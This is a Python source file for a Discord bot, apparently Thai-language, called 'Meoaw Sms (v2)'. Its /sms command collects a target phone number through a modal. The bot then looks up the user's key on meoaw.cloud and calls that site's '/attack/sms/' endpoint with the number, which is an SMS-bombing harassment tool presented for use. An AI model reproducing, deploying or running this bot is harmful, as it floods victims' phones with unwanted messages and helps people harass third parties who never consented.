import interactions
import platform
import os
import requests
from interactions import *

# Config

token = "" # ใส่โทเคนบอท

guild_id = "" # ใส่ไอดีเซิฟเวอร์ Discord

meoaw = interactions.Client(token=token, intents=Intents.ALL)

@interactions.listen()
async def on_ready():

    if platform.system() == 'Windows':

        os.system('cls & title Meoaw Sms ( v2 )')

        print(" ")

        print("Meoaw Sms ( v2 )")

        print(" ")

    else:

        os.system('cls')

        print(" ")

        print("Meoaw Sms ( v2 )")

        print(" ")

@interactions.slash_command(name="sms", description="ยิงเบอร์แรงๆ ( By Meoaw )", scopes=[guild_id])
async def sms(ctx: InteractionContext):

    start = Button(
        style=ButtonStyle.GREEN,
        label="เริ่มยิง",
        custom_id="start",
    )

    await ctx.send("กดปุ่ม `เริ่มยิง` เพื่อใช้งาน", components=[start], ephemeral=True)

@interactions.listen()
async def on_component(event: BaseComponent):
    ctx = event.ctx

    match ctx.custom_id:

        case "start":

            sms_form = Modal(

            ShortText(

                label="📲 เบอร์เป้าหมาย",
                custom_id="phone",
                min_length=3,
                max_length=10,

            ),

            title="🔫 ระบบยิงเบอร์ ( SMS v2 )",

            )
            
            await ctx.send_modal(modal=sms_form)

            modal_ctx: ModalContext = await ctx.bot.wait_for_modal(sms_form)

            phone = modal_ctx.responses["phone"]

            phone_embed = interactions.Embed(description=f"กำลังยิงไปที่ `{phone}`", color=0x98e8f5)

            await modal_ctx.send(embeds=phone_embed, ephemeral=True)

            meoaw_g3 = requests.get(f"https://meoaw.cloud/get/user/{ctx.author.id}")

            user03 = meoaw_g3.json() 

            key = user03["Key"]

            name = user03["Id"]

            meoaw_a = requests.get(f"https://meoaw.cloud/attack/sms/{name}/{key}/{phone}")

            print(" ")

            print(meoaw_a.json())

            print(" ")

            print(f"Attack to {phone} !")

            print(" ")

meoaw.start()

# Code by Meoaw Hub ( Last Update: 1/06/66 7:28 )
